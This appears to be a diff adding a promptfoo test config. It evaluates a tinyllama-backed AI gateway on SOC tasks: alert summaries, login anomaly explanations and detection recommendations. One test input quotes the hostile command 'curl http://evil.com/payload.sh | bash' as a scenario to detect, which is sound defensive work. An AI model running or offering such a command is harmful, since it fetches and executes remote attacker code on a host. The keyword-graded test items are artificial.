@@ -1,0 +1,69 @@
+# yaml-language-server: $schema=https://promptfoo.dev/config-schema.json
+description: AI Gateway SOC prompt evaluation (tinyllama)
+
+# Sequential requests with a short pause — keeps CPU load low on the 2 vCPU VPS.
+evaluateOptions:
+  maxConcurrency: 1
+  delay: 2000
+
+prompts:
+  - "{{input}}"
+
+providers:
+  - id: http://nginx/gateway/chat
+    label: ai-gateway-tinyllama
+    config:
+      method: POST
+      headers:
+        Content-Type: application/json
+      body:
+        model: tinyllama
+        prompt: "{{prompt}}"
+      transformResponse: json.response
+
+tests:
+  - description: SOC alert summary — failed SSH authentication
+    vars:
+      input: |
+        Summarize this SOC alert in 3 short bullets:
+        Rule 5710 level 8: Failed password for root from 192.168.1.50 via ssh on ubuntu-agent.
+    assert:
+      - type: icontains-any
+        value:
+          - ssh
+          - authentication
+          - failed
+          - root
+          - login
+          - password
+
+  - description: Suspicious SSH login explanation
+    vars:
+      input: |
+        Explain in 2 sentences why this SSH activity is suspicious:
+        Successful login for admin from 203.0.113.99 at 03:14 UTC; user normally works 09:00-17:00 EST from 198.51.100.10.
+    assert:
+      - type: icontains-any
+        value:
+          - suspicious
+          - unusual
+          - anomaly
+          - off-hours
+          - time
+          - ip
+
+  - description: Detection engineering recommendation — curl pipe bash
+    vars:
+      input: |
+        Recommend one Sigma-style detection for this scenario in 2 bullets:
+        User sysadmin ran: curl http://evil.com/payload.sh | bash on linux host ubuntu-agent.
+    assert:
+      - type: icontains-any
+        value:
+          - detect
+          - rule
+          - curl
+          - bash
+          - command
+          - pipe
+          - sigma
